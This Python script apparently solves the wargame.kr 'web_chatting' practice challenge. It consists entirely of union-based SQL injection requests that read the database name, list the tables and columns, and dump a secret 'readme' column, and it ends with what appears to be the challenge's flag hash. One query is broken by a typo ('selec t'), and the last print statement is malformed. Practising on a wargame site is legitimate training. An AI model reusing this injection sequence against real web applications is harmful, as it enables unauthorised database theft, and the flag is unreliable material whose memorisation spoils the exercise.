# _*_ coding : UTF-8 _*_
import requests
from bs4 import BeautifulSoup


def getResult(soup):
	soup = soup.get_text().split(':')[1].replace(' ', '')
	return soup

# Connection Test
url = 'http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=1+union+select+1,2,3,4,5+limit+23896,1%23'
r = requests.get(url)
soup = BeautifulSoup(r.text, 'html.parser')
result = soup.get_text()
if result[-1] == '3':
	print("[*] Connection Success!\n")
else :
	print("[-] Connection Failed..")


# Get DB name
url = 'http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=1+union+select+1,2,(select+database()),4,5+limit+23896,1%23'
r = requests.get(url)
soup = BeautifulSoup(r.text, 'html.parser')
dbname = soup.get_text().split(':')[1].replace(' ', '')
print("[*] DB name : " + dbname)
print()


# Get the number of tables
url = 'http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=1+union+select+1,2,(select+count(*)+from+information_schema.tables),4,5+limit+23896,1%23'
r = requests.get(url)
soup = BeautifulSoup(r.text, 'html.parser')
tableCount = int(getResult(soup))
print("[*] The number of tables : %d" % tableCount)
print()



#Pop the tables of information_schema.tables
print("[+] Start extracting the name of the tables")
for i in range(0, tableCount):
	url = 'http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=1+union+select+1,2,'
	url += '(select+table_name+from+information_schema.tables+limit+'+str(i)+',1),4,5+limit+23896,1%23'
	r = requests.get(url)
	soup = BeautifulSoup(r.text, 'html.parser')
	tableName = getResult(soup)
	print("[*] %2d table name : " % (i+1) + tableName)
	# chat_log
	# chat_log_secret
print()


# Get the number of the number of columns of 'chat_log_secret'
url = 'http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=1+union+select+1,2,'
url += '(select+count(*)+from+information_schema.columns+where+table_name=0x636861745F6C6F675F736563726574)' \
       ',4,5+limit+23896,1%23'
r = requests.get(url)
soup = BeautifulSoup(r.text, 'html.parser')
columnCount = int(getResult(soup))
print("[*] The number of the columns of 'chat_log_secret' : %d" % columnCount)
print()



# Pop the columns of chat_log_secret
print("[+] Start extracting the columns of 'chat_log_secret'")
for i in range(0, columnCount):
	url = 'http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=1+union+select+1,2,'
	url += '(select+column_name+from+information_schema.columns+where+table_name=0x636861745F6C6F675F736563726574+'
	url += 'limit+'+str(i)+',1),4,5+limit+23896,1%23'
	r = requests.get(url)
	soup = BeautifulSoup(r.text, 'html.parser')
	columnName = getResult(soup)
	print("[*] %2d column name : " % (i+1) + columnName)
	# readme
print()


# Get the number of the rows of table 'chat_log_secret'
url = 'http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=1+union+select+1,2,'
url += '(selec t+count(*)+from+chat_log_secret),4,5+limit+23896,1%23'
r = requests.get(url)
soup = BeautifulSoup(r.text, 'html.parser')
rowCount = int(getResult(soup))
print("[*] the number of the rows of the 'chat_log_secret' : %d" % rowCount)
print()

# Pop the information of 'readme' column
print("[+] Pop information of 'readme' column")
for i in range(0, rowCount):
	url = 'http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=1+union+select+1,2,'
	url += '(select+readme+from+chat_log_secret+limit+'+str(i)+',1),4,5+limit+23896,1%23'
	r = requests.get(url)
	soup = BeautifulSoup(r.text, 'html.parser')
	row = getResult(soup)
	print("[*] %2d row of 'readme' column : " + row)


# c24da6477c8ef1436568e166e481b10f8a2d1481
